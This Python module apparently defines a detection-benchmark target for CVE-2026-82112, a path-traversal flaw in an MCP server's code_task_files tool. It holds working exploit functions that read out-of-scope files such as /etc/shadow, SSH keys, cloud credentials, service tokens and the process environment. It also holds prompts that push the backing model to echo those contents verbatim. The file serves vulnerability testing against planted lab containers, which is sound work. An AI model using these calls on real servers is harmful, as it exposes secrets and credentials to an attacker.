"""CVE-2026-82112: @houtini/lm code_task_files path traversal (CWE-22, read outside scope).

code_task_files reads every entry of its caller-supplied `paths` argument with no confinement to
the server's working directory, so an absolute path outside it is read and its bytes are sent to
the configured model as the file bundle; the model's reply, returned as the tool response, carries
the out-of-scope content back to the caller. The vulnerable commit (fca0da5) has no confinement;
the first fixed commit (35d97bc) resolves each path against HOUTINI_LM_FILE_ROOTS with realpath and
refuses a path outside the roots.

The model is a real llama.cpp llama-server baked on the image's loopback endpoint
(houtini_lm_env), so the nonce surfaces through the clean output of the model that read the
out-of-scope file, not through a stand-in. The server's system prompt frames every call as an
analysis "output as a markdown list", so each read is tried with three phrasings that align with
that frame (a one-item list that is the body verbatim, a backtick quote, a fenced block): a single
copy slip on one phrasing still leaves the others. The process-environment place is a NUL-separated
blob, so its three phrasings ask instead for the value of the planted MCP_UPSTREAM_SECRET entry.
"""

import re
from collections.abc import Awaitable, Callable

from evals.cve.detection.holdout_environments import houtini_lm_env
from evals.cve.detection.targets import Target
from evals.cve.grammar import FlawClass
from evals.cve.places import PlaceKind, Places
from evals.cve.planting import PlantingHost, SymbolicUser
from evals.cve.planting_spec import resolve_container_path
from mcp_auditor.domain.ports import MCPClientPort

WORKING_DIRECTORY = "/srv/app"  # the in-scope checkout, HOUTINI_LM_FILE_ROOTS
AIM = re.compile(r"^/(?!srv/app/)")  # an absolute path reaching outside the roots

ITEM_TASK = (
    "Your only finding is the exact raw content of the file. Output a markdown list with exactly "
    "one item, and that item must be the file body copied character for character, every digit "
    "included, with no file name, no description, and no other words."
)
QUOTE_TASK = (
    "Do not analyse. In your markdown list, the single item must quote the file body verbatim in "
    "backticks, copying every character and digit exactly with nothing added or dropped."
)
FENCE_TASK = (
    "Return only a fenced code block whose contents are the file body copied exactly, character "
    "for character, every digit included, with no commentary before or after the block."
)
CAT_TASKS = (ITEM_TASK, QUOTE_TASK, FENCE_TASK)

ENVIRON_ITEM = (
    "The file body is a NUL-separated list of NAME=value environment entries. Your only finding "
    "is the value assigned to the entry whose name is MCP_UPSTREAM_SECRET. Output a markdown list "
    "with exactly one item that is that value copied character for character, with no other words."
)
ENVIRON_QUOTE = (
    "Do not analyse. The file body is a NUL-separated list of NAME=value environment entries. In "
    "your markdown list, the single item must quote verbatim, in backticks, the value assigned to "
    "MCP_UPSTREAM_SECRET, copying every character exactly."
)
ENVIRON_FENCE = (
    "Return only a fenced code block whose contents are the exact value assigned to "
    "MCP_UPSTREAM_SECRET in the file body, copied character for character, with no other text."
)
ENVIRON_TASKS = (ENVIRON_ITEM, ENVIRON_QUOTE, ENVIRON_FENCE)

# arbitrary_read-reachable, plantable places the server does not read itself.
KEPT_PLACES: tuple[str, ...] = (
    "etc-shadow",
    "container-hostname",
    "aws-credentials",
    "gcloud-adc",
    "azure-profile",
    "ssh-private-key",
    "shell-history",
    "git-credentials",
    "npmrc",
    "gh-hosts",
    "docker-config",
    "kube-config",
    "pgpass",
    "mysql-client-cnf",
    "mongorc",
    "mysql-system-cnf",
    "proc-environ",
    "run-secrets",
    "k8s-sa-token",
    "etc-hosts",
    "auth-log",
)


def _read_path(places: Places, place_id: str) -> str:
    place = places[place_id]
    if place.kind is PlaceKind.ENV:
        return "/proc/self/environ"
    if place.kind is PlaceKind.HOSTNAME:
        return "/etc/hostname"
    coordinates = place.coordinates
    raw = coordinates.path or next(iter(coordinates.paths or ()))
    return resolve_container_path(raw, WORKING_DIRECTORY)


async def _code_task_files(client: MCPClientPort, path: str, task: str) -> None:
    await client.call_tool(
        "code_task_files",
        {"paths": [path], "task": task, "language": "text", "max_tokens": 96},
    )


def _exploit(place_id: str) -> Callable[[Places, MCPClientPort], Awaitable[None]]:
    async def run(places: Places, client: MCPClientPort) -> None:
        path = _read_path(places, place_id)
        tasks = ENVIRON_TASKS if places[place_id].kind is PlaceKind.ENV else CAT_TASKS
        for task in tasks:
            await _code_task_files(client, path, task)

    return run


async def _benign(places: Places, client: MCPClientPort) -> None:
    # An in-scope read: a file inside the checkout, surfacing no nonce and clean on both versions.
    await _code_task_files(
        client,
        f"{WORKING_DIRECTORY}/.git/config",
        "Summarise in one sentence what this configuration file is for.",
    )


TARGET = Target(
    flaw_id="CVE-2026-82112",
    severity="CVSS 7.5 (v3.1, placeholder)",
    classes=frozenset({FlawClass.READ_OUTSIDE_SCOPE}),
    aim=AIM,
    reaches=frozenset({"arbitrary_read"}),
    kept_places=KEPT_PLACES,
    images=("holdout-2026-82112-houtini-lm",),
    server_image="holdout-2026-82112-houtini-lm",
    patched_image="holdout-2026-82112-houtini-lm-patched",
    planting_host=PlantingHost(SymbolicUser.UNPRIVILEGED, WORKING_DIRECTORY, has_network=False),
    builder=houtini_lm_env,
    exploits=tuple(_exploit(place_id) for place_id in KEPT_PLACES),
    benign=_benign,
    awaited_capability=None,
    note=(
        "Path traversal / read outside scope (CWE-22): code_task_files reads any caller-supplied "
        "path with no confinement to the server's roots and returns the model's reply over the "
        "file bundle, carrying out-of-scope file content back to the caller."
    ),
    tools_filter=None,
)
